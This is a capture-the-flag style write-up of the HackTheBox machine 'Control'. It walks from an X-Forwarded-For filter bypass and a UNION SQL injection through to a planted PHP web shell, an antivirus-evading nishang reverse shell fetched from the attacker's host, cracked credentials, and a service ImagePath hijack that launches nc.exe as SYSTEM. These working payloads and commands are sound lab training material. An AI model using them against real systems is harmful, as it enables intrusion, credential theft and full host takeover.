---
title: Control HackTheBox writeup made by a dumb !!!
author: dumbx90
date: 2020-04-29 14:10:00 +0800
categories: [Blogging, HTB, Writeup]
tags: [htb,pentest,windows,hard,services,retired]
---

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/active-description.png?raw=true)

<script id="asciicast-IjAIFheWFsb5wVNBZReXTyXLg" src="https://asciinema.org/a/IjAIFheWFsb5wVNBZReXTyXLg.js" async></script>

## Sumary 

The control  is a hard machine. First we fuzz  **HTTP Headers** to bypass  filter to access the administrator page, after we discovery a **sql injection** and get hashes and upload a webshell that give us a command execution which can be used to initial shell. After initial shell we move to **hector** user and discovery what services this particular user is in **control**. Change  path of binary and start the service get us a **Administrator Shell**. 



## Skills Necessary  

- Recon

- HTTP Headers

- Basic knowledge how user Burp Suite

  

## Skills Learned

- SQL Injection vanilla
- Bypass access filter using HTTP Headers
- Basic Windows Register
- Windows Services




## Recon 



A simple nmap scan reveals a lot of open ports:

```bash
# Nmap 7.80 scan initiated Wed Apr  8 07:21:14 2020 as: nmap -sC -sV -p80,135,3306,49666,49667 -oA nmap-all-10.10.10.167 10.10.10.167
Nmap scan report for 10.10.10.167
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings: 
|   LANDesk-RC, LDAPSearchReq, RPCCheck, SSLSessionReq: 
|_    Host '10.10.14.5' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=4/8%Time=5E8DB3B8%P=x86_64-pc-linux-gnu%r(RPC
SF:Check,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSession
SF:Req,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchRe
SF:q,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LANDesk-RC,49,
SF:"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  8 07:22:16 2020 -- 1 IP address (1 host up) scanned in 61.99 seconds

```

In the nmap we found some defautl ports open. Lets check the http page:

 

<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-webpage.png" alt="control-webpage" style="zoom:75%;" />



The fisrt thing came to my attention is the link **Admin** in  the right side, after I cliked in the link we see   this page:  



<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-admin-webpage.png" style="zoom:75%;" />



Looking for something useful in source page I saw this note write in the comments:

````html
<!-- To Do:
	- Import Products
	- Link to new payment system
	- Enable SSL (Certificates location \\192.168.4.28\myfiles)
<!-- Header -->
````







## Ffluf



The main idea is fuzz some **HTTP Headers** with the ip address we found in HTML source code to see if we can bypass this restriction:

```bash
ffuf -w ~/tools/SecLists/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt -u http://10.10.10.167/admin.php -H "FUZZ: 192.168.4.28"  -c -fs 89

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.167/admin.php
 :: Wordlist         : FUZZ: /home/dumb/tools/SecLists/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt
 :: Header           : FUZZ: 192.168.4.28
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 89
________________________________________________

X-Forwarded-For         [Status: 200, Size: 7933, Words: 327, Lines: 154]
:: Progress: [1152/1152] :: Job [1/1] :: 288 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```



So the **X-Forwarded-For** header works well. Lets install the extension **Modify Header Value**. After this we can access the  **Admin** page:

<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-header-xforwarded-for.png" style="zoom:75%;" />



<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-admin-webpage-access.png" style="zoom:75%;" />





## SQL 101 



The first thing came to my mind is **sql injection**.   Lets give a little explanation from site [CTF 101](https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/):

Imagine we have the following snippet in **php** code: 

```php
<?php
    $productID = $_GET['productID']; 
    $result = mysql_query("SELECT * FROM users WHERE productID='$productID'");
?>
```

Now Imagine if  user that in control of variable **productID** put in the search field the following string:

```bash
' // a singe quote
```

Take a breath. OK. The single quote will be trigger a error in **mysql**  because the final sentence in **php** code will be translate for something like this:

````php
$result = mysql_query("SELECT * FROM users WHERE productID='''");
````

That will bet translate in  **mysql** query: 

````mysql
SELECT * FROM productID where productID = ''';
````

The sentence above will return a **mysql** error. This kind  of **SQL Injection** is line ***vanilla injecton***.



## Abusing SQL Injection in find form



Now we have a little knowledge in **mysql injection**, lets try to exploit the form.  For this I will follow the **Rules of dumb**:

1. First , try something simple in payload 
2. Understanding how the application response our requests
3. Increase the complexity of payload gradually



Fire up burp and lets try our first payload. To  rule number one, lets send a payload with **1** (Number one)

```php
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.167/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28

productName=1
```

<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-burp-request-1.png" style="zoom:75%;" />



Now lets continuous with  "  '  " (single quote) as payload

```php
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.167/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28

productName=' 
```

<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-burp-request-single-quoete.png" alt="control-burp-request-single-quoete" style="zoom:75%;" />



Its clearly that has a **sql injection** in the form.  We can continuous by hand or use **sqlmap**. Let do by hand, manually. The first thing we have to do is know how many columns has in the database. This information will be usefull for exfiltrate data.  We use reserver word **ORDER BY** from **mysql**. That word is used to sort the records of query. 

```php
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.167/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28

productName=' order by 1 -- #
```

<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-order-by-1.png" alt="control-order-by-1" style="zoom:75%;" />



We increase the number of columns  in **order by** until get a **mysql error**:

```bash	
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.167/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28

productName=' order by 7 -- #
```

<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-order-by-7.png" alt="control-order-by-7" style="zoom:75%;" />



Its clearly we have 06 (six) columns to use for exfiltrate data. To do that we use the reserved words **UNION SELECT**  from **mysql**:

1. Discovery user:

`````php
productName=' union select 1,2,3,4,5,user()-- #
`````

2.  Discovery databases names:

```php
productName=' union select 1,2,3,4,5,group_concat(SCHEMA_NAME SEPARATOR "\n") from INFORMATION_SCHEMA.SCHEMATA -- #
```

3. Discovery tables:

```php
productName=' union select 1,2,3,4,5,group_concat(TABLE_NAME SEPARATOR "\n") from INFORMATION_SCHEMA.TABLES -- #
```

4. Discovery Columns:

```php
productName=' union select 1,2,3,4,5,group_concat(COLUMN_NAME SEPARATOR "\n") from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="mysql" -- #
```

5. Discovery hashes:

```bash
productName=' union select 1,2,3,4,5,group_concat(User,":",Password  SEPARATOR "\n") from mysql.user  -- #
```

````php
root:*0A4A5CAD344718DC418035A1F4D292BA603134D8
root:*0A4A5CAD344718DC418035A1F4D292BA603134D8
root:*0A4A5CAD344718DC418035A1F4D292BA603134D8
root:*0A4A5CAD344718DC418035A1F4D292BA603134D8
manager:*CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
hector:*0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
````

6. Discovery privileges:

```php
productName=' union select 1,2,3,4,5,group_concat(GRANTEE,":",PRIVILEGE_TYPE,":",IS_GRANTABLE SEPARATOR "\n") from INFORMATION_SCHEMA.USER_PRIVILEGES  -- #
```

7. Load files:

```php
productName=' union select 1,2,3,4,5,(Select concat ("dumb","\n", TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\index.php")),"\n","dumb"))  -- #
```

````php
productName=' union select 1,2,3,4,5,(Select concat ("dumb","\n", TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\admin.php")),"\n","dumb"))  -- #
````

````php
private static $dbName = 'warehouse' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'manager';
private static $dbUserPassword = 'l3tm3!n';
````



## Write Files



So far so god. We get some hashes and discovery privileges of user in database. **hector** and **root** has **FILE** privilege:

```mysql
'hector'@'localhost':FILE:YES
----snip--------------------
'root'@'localhost':FILE:YES
```

Lets try upload some file. Follow the **rules of dumb** and **kiss** principle,  start wih some little text file with 10 **A**' s. 

```php
productName=' union select 1,2,3,4,5,"AAAAAAAAAA" INTO OUTFILE "C:\\inetpub\\wwwroot\\dumb.txt"  -- #
```

We get a **mysql** error, but if we try the same command again, **mysql** tell us that file already exist.

<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-upload-file-error.png" style="zoom:75%;" />



Thats right, beside the **mysql** error the file was created:



<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-upload-dumb-txt.png" alt="control-upload-dumb-txt" style="zoom:67%;" />



## Command Execution



Lets create a simple php shell:

````php
<?php system($_GET[\'cmd\']); ?>
````

````php
productName=' union select 1,2,3,4,5,"<?php system($_REQUEST[\'cmd\']); ?>" INTO OUTFILE "C:\\inetpub\\wwwroot\\dumb.php"  -- #
````

<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-shell-command-whoami.png" alt="control-shell-command-whoami" style="zoom:75%;" />



For convenience we send our request to burb, intercept them  and change the request method( right click and select "change the reques method").

````php
POST /dumb.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

cmd=whoami
````

We achieve **command execution** in host. If we can, upload a better webshell but my goal is  **"Live of The Land"**, so I will continue with simple webshell. Just for example, setup a HTTP server with python and run the following command in **burp repeater**:

```php
cmd=powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/dumb-wee.php')"
```





## Initial Shell 



Now we use **nishang webshell** to get a shell, but first we need change somethings to escape **Anti Virus** :

```bash
❯ cp ~/tools/nishang/Shells/Invoke-PowerShellTcp.ps1 dumb-shell.ps1 
```

1. Delete all comments, 
2. Change the name of the function 
3. Write this in the end of file:

```powershell
function Give_A_Shell_To_Dumb
{
<#
#>
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )


    try
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target."
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Give_A_Shell_To_Dumb -Reverse -IPAddress 10.10.14.13 -Port 4242
```

Now in burp repeater run:

```php
cmd=powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/dumb-shell.ps1')"
```

````bash
❯ nc -nlvp 4242 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:49681.
Windows PowerShell running as user CONTROL$ on CONTROL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot>
````

<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-initial-shell.png" alt="control-initial-shell" style="zoom:75%;" />



## Crack Hashes



Remember hashes we get from **msql injection**.  After ckack them we recovery one password.  

```powershell
PS D:\tools\hashcat-5.1.0> .\hashcat64.exe -m 300 --user D:\hackthebox\control\mysql-hash.txt D:\SecLists-master\Passwords\Leaked-Databases\rockyou.txt --show
hector:0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
```

Recap all credentials we have: 

```bash
hector:l33th4x0rhector
manager:l3tm3!n
```



## Lateral Movement



After some enumeration we discovery that user **hector** is in   **Remote Management System**  group. 

```powershell
PS C:\inetpub\wwwroot> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Hector                   WDAGUtilityAccount
The command completed with one or more errors.

PS C:\inetpub\wwwroot> net user hector
User name                    Hector
Full Name                    Hector
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/1/2019 12:27:50 PM
Password expires             Never
Password changeable          11/1/2019 12:27:50 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/7/2020 9:47:14 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users
Global Group memberships     *None
The command completed successfully.

PS C:\inetpub\wwwroot>
```

Move to this user and run enumeration again. Let create a **PSCredential object ** to run commnad as **hector** user. Set up a new netcat listener and type this commands in shell that you already have in the machine:

```powershell
$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Fidelity\Hector" , $pass)
Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock {IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/dumb-shell.ps1')}
```

1. Convert the password to a secure string
2. Create a new objetct (PS Credential) 
3. Run command with this new object created.

```powershell
nc -4nlvp 4242
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:49688.
Windows PowerShell running as user Hector on CONTROL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\Users\Hector\Documents> whoami
control\hector
```



## Privilege Escalation



```powershell
PS C:\Users\Hector\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Running  several tools give me nothing, so I come back to the basics.   Looking for **Powershell** history give what I want. 

```powershell
PS C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline> dir

    Directory: C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/25/2019   1:36 PM            114 ConsoleHost_history.txt


PS C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline> gc ConsoleHost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
```

Running this comnans give me a ist of services runnning on the machine. For filter the services that **hector** can change I run the following command:

```powershell
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone"
```

This is give us a  gyge list of services that **hector** can change. I will focues in **wuauserv** service:

```powershell
PS C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline> get-ItemProperty HKLM:\System\CurrentControlSet\Services\wuauserv


DependOnService     : {rpcss}
Description         : @%systemroot%\system32\wuaueng.dll,-106
DisplayName         : @%systemroot%\system32\wuaueng.dll,-105
ErrorControl        : 1
FailureActions      : {128, 81, 1, 0...}
ImagePath           : C:\Windows\system32\svchost.exe -k netsvcs -p
ObjectName          : LocalSystem
RequiredPrivileges  : {SeAuditPrivilege, SeCreateGlobalPrivilege, SeCreatePageFilePrivilege, SeTcbPrivilege...}
ServiceSidType      : 1
Start               : 3
SvcMemHardLimitInMB : 246
SvcMemMidLimitInMB  : 167
SvcMemSoftLimitInMB : 88
Type                : 32
PSPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\wuauserv
PSParentPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
PSChildName         : wuauserv
PSDrive             : HKLM
PSProvider          : Microsoft.PowerShell.Core\Registry

PS C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline>
```

Enter in the register i will try to change the **ImagePath** of service:

```powershell
PS C:\Users\Hector\Documents> cd HKLM:
PS HKLM:\>
PS HKLM:\> cd SYSTEM
PS HKLM:\SYSTEM> cd CurrentControlSet
PS HKLM:\SYSTEM\CurrentControlSet> cd Services
PS HKLM:\SYSTEM\CurrentControlSet\Services> get-item wuauserv


    Hive: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services


Name                           Property
----                           --------
wuauserv                       DependOnService     : {rpcss}
                               Description         : @%systemroot%\system32\wuaueng.dll,-106
                               DisplayName         : @%systemroot%\system32\wuaueng.dll,-105
                               ErrorControl        : 1
                               FailureActions      : {128, 81, 1, 0...}
                               ImagePath           : C:\Windows\system32\svchost.exe -k netsvcs -p
                               ObjectName          : LocalSystem
                               RequiredPrivileges  : {SeAuditPrivilege, SeCreateGlobalPrivilege,
                               SeCreatePageFilePrivilege, SeTcbPrivilege...}
                               ServiceSidType      : 1
                               Start               : 3
                               SvcMemHardLimitInMB : 246
                               SvcMemMidLimitInMB  : 167
                               SvcMemSoftLimitInMB : 88
                               Type                : 32


PS HKLM:\SYSTEM\CurrentControlSet\Services>
```



Change value for something simple to see if works:



```powershell
PS HKLM:\SYSTEM\CurrentControlSet\Services> set-itemproperty -path wuauserv -Name ImagePath -Value "Dumb Way"
PS HKLM:\SYSTEM\CurrentControlSet\Services> get-item wuauserv


    Hive: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services


Name                           Property
----                           --------
wuauserv                       DependOnService     : {rpcss}
                               Description         : @%systemroot%\system32\wuaueng.dll,-106
                               DisplayName         : @%systemroot%\system32\wuaueng.dll,-105
                               ErrorControl        : 1
                               FailureActions      : {128, 81, 1, 0...}
                               ImagePath           : Dumb Way
                               ObjectName          : LocalSystem
                               RequiredPrivileges  : {SeAuditPrivilege, SeCreateGlobalPrivilege,
                               SeCreatePageFilePrivilege, SeTcbPrivilege...}
                               ServiceSidType      : 1
                               Start               : 3
                               SvcMemHardLimitInMB : 246
                               SvcMemMidLimitInMB  : 167
                               SvcMemSoftLimitInMB : 88
                               Type                : 32


PS HKLM:\SYSTEM\CurrentControlSet\Services>
```

Works !!!! Great. Now we can get a **Administrator Shell**



## Administrator Shell 



The simple task we have to do is change the **ImagePath** .  I wil use **netcat** intead of **Powershell**.

```powershell
PS HKLM:\SYSTEM\CurrentControlSet\Services> c:
PS C:\Users\Hector\Documents>cd c:\Windows\System32\Spool\Drivers\Colors
PS C:\Windows\System32\Spool\Drivers\color> wget http://10.10.14.13/nc.exe -o nc.exe
PS C:\Windows\System32\Spool\Drivers\color> dir nc.exe


    Directory: C:\Windows\System32\Spool\Drivers\color


Mode                LastWriteTime         Length Name                                           
----                -------------         ------ ----                                           
-a----         5/8/2020  12:49 AM          59392 nc.exe                                         


PS C:\Windows\System32\Spool\Drivers\color>

```

```powershell
PS HKLM:\SYSTEM\CurrentControlSet\Services> set-itemproperty -path wuauserv -Name ImagePath -Value "C:\Windows\System32\Spool\Drivers\color\nc.exe 10.10.14.13 4242 -e powershell"
PS HKLM:\SYSTEM\CurrentControlSet\Services> get-item wuauserv


    Hive: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services


Name                           Property
----                           --------
wuauserv                       DependOnService     : {rpcss}
                               Description         : @%systemroot%\system32\wuaueng.dll,-106
                               DisplayName         : @%systemroot%\system32\wuaueng.dll,-105
                               ErrorControl        : 1
                               FailureActions      : {128, 81, 1, 0...}
                               ImagePath           : C:\Windows\System32\Spool\Drivers\color\nc.exe 10.10.14.13 4242
                               -e powershell
                               ObjectName          : LocalSystem
                               RequiredPrivileges  : {SeAuditPrivilege, SeCreateGlobalPrivilege,
                               SeCreatePageFilePrivilege, SeTcbPrivilege...}
                               ServiceSidType      : 1
                               Start               : 3
                               SvcMemHardLimitInMB : 246
                               SvcMemMidLimitInMB  : 167
                               SvcMemSoftLimitInMB : 88
                               Type                : 32


PS HKLM:\SYSTEM\CurrentControlSet\Services>
```

Now Lets start service:

```powershell
PS HKLM:\SYSTEM\CurrentControlSet\Services> Start-Service wuauserv
```

And get a shell in other terminal:



```powershell
❯ nc -nlvp 4242
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:49705.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::d8ba:9163:d35b:2cb1
   Link-local IPv6 Address . . . . . : fe80::d8ba:9163:d35b:2cb1%8
   IPv4 Address. . . . . . . . . . . : 10.10.10.167
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:3982%8
                                       10.10.10.2
PS C:\Windows\system32>
```







## Tools used in this post

- Burp Suite

- Hascat

- https://mybrowseraddon.com/modify-header-value.html

  

## Terminal Customization 

- https://eugeny.github.io/terminus/

- https://ohmyz.sh/ (afowler theme)

- https://github.com/samoshkin/tmux-config

  

## Reference Links

- http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html
- https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/
- https://portswigger.net/web-security/sql-injection/cheat-sheet

- https://dev.mysql.com/doc/refman/8.0/en/information-schema.html

- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

- https://sec-consult.com/en/blog/2019/04/windows-privilege-escalation-an-approach-for-penetration-testers/

  